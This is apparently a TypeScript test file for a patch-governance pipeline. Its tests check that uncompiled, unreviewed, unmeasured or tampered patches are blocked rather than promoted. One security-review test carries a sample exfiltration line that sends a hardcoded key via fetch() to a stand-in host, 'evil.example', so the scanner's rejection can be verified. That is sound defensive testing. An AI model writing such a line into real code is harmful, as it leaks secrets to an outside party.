/**
 * The chain-of-failures invariant.
 *
 * Every test in this file corresponds to a defect that was actually found by
 * executing the governance pipeline with deliberately broken inputs — not to a
 * shape assertion on a type. Each one asserts the same underlying law:
 *
 *   MISSING, UNRUN, TAMPERED OR REGRESSED EVIDENCE MUST NEVER AUTHORIZE.
 *
 * A stage that cannot prove it measured something reports BLOCKED, never
 * PASSED. These tests exist so that a future refactor which reintroduces any
 * one of the original bugs fails loudly, instead of quietly resuming the
 * behaviour of advancing proposals on absent evidence.
 */
import { describe, test, expect } from 'bun:test'
import { mkdtemp, writeFile, mkdir } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Hono } from 'hono'
import { Bus } from '../bus/index.js'
import { createDatabase, migrate } from '../storage/db.js'
import { GovernanceGate } from '../patching/governance/index.js'
import type {
  BenchmarkStage,
  CanaryStage,
  PromoteStage,
  SecurityStage,
} from '../patching/governance/index.js'
import { CanaryRunner } from '../patching/governance/canary.js'
import { BenchmarkRunner } from '../patching/governance/benchmark.js'
import { VariantRouter } from '../patching/governance/traffic.js'
import { LatencyTracker } from '../patching/latency.js'
import { RegressionDetector } from '../patching/governance/regression.js'
import { SecurityReview } from '../patching/governance/security-review.js'
import { SecurityScanner } from '../patching/security.js'
import { verify } from './verifier.js'
import { mountEvolutionRoutes } from '../routes/evolution.js'
import { ImprovementLedger } from './ledger.js'

type MiraDB = import('../storage/db.js').MiraDB
type Lat = { p50: number; p95: number }
const snap = (p50: number, p95: number): Lat => ({ p50, p95 })
const pt = (
  value: number,
  unit = 'ms',
): import('../patching/governance/regression.js').MetricPoint => ({
  value,
  unit,
})

// A minimal but schema-complete patch fixture.
const patch = (id: string): import('../patching/patcher.js').Patch => ({
  id,
  painPointId: 'latency',
  kind: 'latency',
  targetFile: 'src/a.ts',
  reason: 'p95 above budget',
  change: 'export const x = 1',
  verification: 'bun test',
  severity: 'medium',
  score: 0.5,
  createdAt: Date.now(),
})
const verified = (): import('../patching/verifier.js').VerifyResult => ({
  verified: true,
  reason: 'shadow ok',
})

async function freshDB(): Promise<{ db: MiraDB; done: () => void }> {
  const db = createDatabase(':memory:')
  await migrate(db as never)
  const sqlite = db.sqlite as unknown as { close?: () => void }
  return {
    db: db as unknown as MiraDB,
    done: () => {
      try {
        sqlite.close?.()
      } catch {}
    },
  }
}

describe('INVARIANT: absent evidence never authorizes', () => {
  // ── DEFECT 1 ────────────────────────────────────────────────────────────
  // The verifier ran `npx tsc --noEmit` with cwd = the untouched repository, so
  // a candidate that did not compile still reported verified:true. Fixed by
  // verifying the materialized candidate tree (commit 1bf4a3b).
  test('a candidate that does not compile is never "verified"', async () => {
    const tree = await mkdtemp(join(tmpdir(), 'mira-inv-verify-'))
    await mkdir(join(tree, 'src'), { recursive: true })
    // A deliberate type error: numeric literal assigned to a string.
    await writeFile(join(tree, 'src', 'broken.ts'), 'export const x: string = 42\n')
    await writeFile(
      join(tree, 'tsconfig.json'),
      JSON.stringify({ compilerOptions: { strict: true } }),
    )

    const result = await verify(
      { patch: '-x\n+y', riskScore: 0.1, targetFile: 'src/broken.ts' } as never,
      { treeDir: tree, runStatic: true },
    )

    expect(result.static.passed).toBe(false)
    expect(result.verified).toBe(false)

    // The other half of the same defect: with NO candidate tree at all, the
    // verifier must not silently fall back to checking the repository (which
    // typechecks cleanly) and report the patch as verified. This is the case
    // that made the bug so convincing.
    const noTree = await verify(
      { patch: '-x\n+y', riskScore: 0.1, targetFile: 'src/a.ts' } as never,
      { runStatic: true },
    )
    expect(noTree.static.passed).toBe(false)
    expect(noTree.verified).toBe(false)
    expect(JSON.stringify(noTree.details)).toContain('no candidate tree')
  })

  // ── DEFECT 2 ────────────────────────────────────────────────────────────
  // The security stage discarded every scanner finding and reported passed:true
  // ("no issues"), walking proposals to SECURITY_PASSED on unreviewed code.
  // Fixed to fail closed on high/critical severity (commit 1bf4a3b).
  test('a high-severity finding is never "no issues"', async () => {
    const review = new SecurityReview(new SecurityScanner())
    // Exfiltration of a hardcoded secret to a remote host.
    const exfil =
      '+const key = "sk-1234567890abcdefghijklmnopqrstuvwxyz"; fetch("https://evil.example/" + key)'
    const result = await review.review(exfil, 'src/net.ts')

    expect(result.passed).toBe(false)
    expect(result.outcome).toBe('FAILED')
  })

  // ── DEFECT 3 ────────────────────────────────────────────────────────────
  // A proposal that had never been canaried reached CANARY_PASSED with zero
  // traffic observed, and the missing sample count was reported as
  // "passed: true". Fixed to BLOCK on insufficient evidence (commit a2a20e2).
  test('a canary that observed nothing is never "passed"', async () => {
    const tracker = new LatencyTracker()
    const canary = new CanaryRunner(tracker, { sleep: async () => {}, router: new VariantRouter() })
    // Registered but never sampled: attribution requires hashed keys, so a
    // route that receives no traffic must be refused, not passed.
    canary.route('route-canary', { trafficPct: 100, resolveVariant: () => 'variant-a' })
    const out = await canary.start('route-canary', {
      trafficPct: 100,
      durationMs: 20,
      slo: { p50Ms: 1000, p95Ms: 2000, errorRate: 0.5 },
      minSamples: 10,
    })

    expect(out.outcome).toBe('BLOCKED')
    expect(out.passed).toBe(false)
  })

  // ── DEFECT 4 ────────────────────────────────────────────────────────────
  // The canary recorded baseline-vs-baseline traffic and called it a candidate
  // comparison. Now blocked unless execution is explicitly bound to the variant.
  test('a canary cannot report a verdict without executing the candidate', async () => {
    const tracker = new LatencyTracker()
    for (const ms of [10, 12, 11]) tracker.record(ms, 'route')
    const runner = new CanaryRunner(tracker, {
      sleep: async () => {},
      router: new VariantRouter(),
    })
    runner.route('route', { trafficPct: 100, resolveVariant: () => 'variant-a' })
    const out = await runner.start('route', {
      trafficPct: 100,
      durationMs: 20,
      slo: { p50Ms: 1000, p95Ms: 2000, errorRate: 0.5 },
      minSamples: 1,
    })

    expect(out.outcome).toBe('BLOCKED')
    expect(out.reason).toContain('does not execute candidate code')
  })

  // ── DEFECT 5 ────────────────────────────────────────────────────────────
  // The regression gate only compared latency, so a candidate that made
  // successRate collapse from 100% to 20% sailed through as a promotion.
  // Fixed to classify quality axes, including inverse ones (commit e0c3f56).
  test('a collapsing quality metric is a regression, not an improvement', () => {
    const detector = new RegressionDetector()

    // Metrics are MetricPoints ({value, unit}), not raw numbers.
    const worseQuality = detector.detect({
      baseline: { latencyMs: pt(100), successRate: pt(100, '%') },
      candidate: { latencyMs: pt(100), successRate: pt(20, '%') },
    })
    expect(worseQuality.passed).toBe(false)

    // Latency is inverse-quality: higher is worse.
    const slower = detector.detect({
      baseline: { latencyMs: pt(100), p95: pt(200), errorRate: pt(0.01, 'ratio') },
      candidate: { latencyMs: pt(400), p95: pt(800), errorRate: pt(0.01, 'ratio') },
    })
    expect(slower.passed).toBe(false)

    // Genuine improvement on every axis still passes — the gate must not be
    // satisfiable only by rejecting everything.
    const better = detector.detect({
      baseline: { latencyMs: pt(400), successRate: pt(20, '%') },
      candidate: { latencyMs: pt(100), successRate: pt(100, '%') },
    })
    expect(better.passed).toBe(true)
  })

  // ── DEFECT 6 ────────────────────────────────────────────────────────────
  // ledger.remember() was wrapped in `catch {}`, so a storage failure answered
  // HTTP 200 claiming `verdict: "verified"` had been recorded while nothing
  // was persisted (commit 61c94a3).
  test('a decision that failed to persist never reports success', async () => {
    const { db } = await freshDB()
    const bus = new Bus()
    const real = new ImprovementLedger(db, bus)
    // remember() is synchronous in the real ledger; the stub must match.
    const broken = Object.create(real) as Record<string, unknown>
    broken['remember'] = () => {
      throw new Error('storage exhausted')
    }

    const app = new Hono()
    mountEvolutionRoutes(app as never, { db, bus, ledger: broken as unknown as ImprovementLedger })
    const res = await app.request('/evolution/observe', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ failure: 'timeouts on the default lane', evidence: { n: 1 } }),
    })

    expect(res.status).toBe(500)
    const body = (await res.json()) as { error: string; ledger?: unknown }
    expect(body.error).toContain('could not be recorded')
    expect(body.ledger).toBeUndefined()
  })

  // ── DEFECT 7 ────────────────────────────────────────────────────────────
  // The benchmark stage returned passed:true with the reason "benchmark
  // skipped" when no measurements existed, advancing on zero evidence.
  test('a benchmark with no measurements blocks instead of passing', async () => {
    // Inject a tracker so this reaches the "no measurements" guard. Without one
    // the earlier no-tracker guard would BLOCK first and this test would pass
    // for the wrong reason — masking the guard it claims to cover.
    const bench = new BenchmarkRunner(new LatencyTracker())
    const result = await bench.run(undefined, undefined)

    expect(result.passed).toBe(false)
    expect(result.outcome).toBe('BLOCKED')
    expect(result.reason).not.toContain('skipped')

    // ...and the same is true when only one arm was measured.
    const oneArm = await bench.run(snap(100, 200), undefined)
    expect(oneArm.outcome).toBe('BLOCKED')
  })

  // ── DEFECT 8 ────────────────────────────────────────────────────────────
  // The promotion gate's stage re-validation claimed defense-in-depth against
  // tampering, but the evidence it validates lives in the row it trusts, so a
  // forged {passed:true} is indistinguishable from a genuine one. The comment
  // now states this; the executable law is the one below — a row whose stages
  // never ran cannot be promoted, and a refusal always carries a reason
  // (commit 4ba82e5).
  test('a promotion refusal always carries an actionable reason', async () => {
    const { db } = await freshDB()
    const gate = new GovernanceGate({
      db,
      bus: new Bus(),
      rootDir: process.cwd(),
      // Stages that measure something, so promotion reaches the promoter and
      // the refusal is the promoter's, not a stage gate.
      benchmark: {
        run: async () => ({ passed: true, reason: 'ok', before: { p95Ms: 100 } }),
      } satisfies BenchmarkStage,
      canary: {
        start: async () => ({ passed: true, reason: 'ok', metrics: { p95Ms: 100 } }),
      } satisfies CanaryStage,
      security: {
        review: async () => ({ passed: true, reason: 'ok', outcome: 'PASSED' }),
      } satisfies SecurityStage,
      // A promoter that refuses without explanation — the exact shape that
      // previously left an operator unable to tell "denied" from "disabled".
      promoter: { promote: async () => ({ applied: false }) } satisfies PromoteStage,
    })
    const proposal = await gate.createProposal(patch('patch_refuse'), verified())
    await gate.advance(proposal.id)
    await gate.advance(proposal.id)
    await gate.advance(proposal.id) // → CANARY_PASSED with real stage evidence

    const out = await gate.promote(proposal.id)
    expect(out.applied).toBe(false)
    expect(out.reason ?? '').not.toBe('')
  })

  // ── THE INVARIANT ITSELF ────────────────────────────────────────────────
  // A proposal with no recorded stage evidence whatsoever must be refused by
  // every path that can authorize work, and must never reach a promoting state.
  test('a proposal with no stage evidence cannot be promoted', async () => {
    const { db } = await freshDB()
    // Two proposals: one genuinely advanced (evidence present), and one whose
    // stage evidence has been wiped out from underneath it. The second is the
    // case the re-validation exists for — a row that reached CANARY_PASSED via
    // a legacy writer or a build whose stages fail-opened.
    const gate = new GovernanceGate({
      db,
      bus: new Bus(),
      rootDir: process.cwd(),
      benchmark: {
        run: async () => ({ passed: true, reason: 'ok', before: { p95Ms: 100 } }),
      } satisfies BenchmarkStage,
      canary: {
        start: async () => ({ passed: true, reason: 'ok', metrics: { p95Ms: 100 } }),
      } satisfies CanaryStage,
      security: {
        review: async () => ({ passed: true, reason: 'ok', outcome: 'PASSED' }),
      } satisfies SecurityStage,
      promoter: { promote: async () => ({ applied: true }) } satisfies PromoteStage,
    })
    const honest = await gate.createProposal(patch('patch_honest'), verified())
    await gate.advance(honest.id)
    await gate.advance(honest.id)
    await gate.advance(honest.id)

    // Now the tampered twin: same state, no stage evidence at all.
    const forged = await gate.createProposal(patch('patch_forged'), verified())
    await gate.advance(forged.id)
    await gate.advance(forged.id)
    await gate.advance(forged.id)
    const row = (await gate.get(forged.id))!
    expect(row.state).toBe('CANARY_PASSED')
    await gate.store.update(forged.id, {
      ...row,
      metadata: {} as never,
      updatedAt: Date.now(),
      state: row.state,
    })

    const out = await gate.promote(forged.id)
    expect(out.applied).toBe(false)
    expect(out.reason).toContain('stage_missing')

    const after = await gate.get(forged.id)
    expect(after?.state).not.toBe('PROMOTED')
  })
})
